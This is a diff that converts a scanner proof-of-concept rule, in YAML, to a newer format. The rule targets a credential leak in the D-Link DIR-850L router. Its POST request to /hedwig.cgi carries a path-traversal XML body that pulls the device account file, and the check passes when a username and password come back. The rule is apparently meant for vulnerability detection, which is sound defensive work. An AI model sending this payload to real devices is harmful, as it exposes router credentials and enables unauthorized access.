@@ -1,17 +1,21 @@
 name: poc-yaml-dlink-850l-info-leak
+manual: true
+transport: http
 rules:
-  - method: POST
-    path: /hedwig.cgi
-    headers:
-      Content-Type: text/xml
-      Cookie: uid=R8tBjwtFc8
-    body: |-
-      <?xml version="1.0" encoding="utf-8"?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>
-    follow_redirects: false
-    expression: >
-      response.status == 200 && response.content_type.contains("xml") && response.body.bcontains(b"</usrid>") && response.body.bcontains(b"</password>") && response.body.bcontains(b"<result>OK</result>")
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /hedwig.cgi
+            headers:
+                Content-Type: text/xml
+                Cookie: uid=R8tBjwtFc8
+            body: <?xml version="1.0" encoding="utf-8"?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>
+            follow_redirects: false
+        expression: response.status == 200 && response.content_type.contains("xml") && response.body.bcontains(b"</usrid>") && response.body.bcontains(b"</password>") && response.body.bcontains(b"<result>OK</result>")
+expression: r0()
 detail:
-  author: cc_ci(https://github.com/cc8ci)
-  Affected Version: "Dir-850L"
-  links:
-    - https://xz.aliyun.com/t/2941
+    author: cc_ci(https://github.com/cc8ci)
+    links:
+        - https://xz.aliyun.com/t/2941
+    Affected Version: Dir-850L
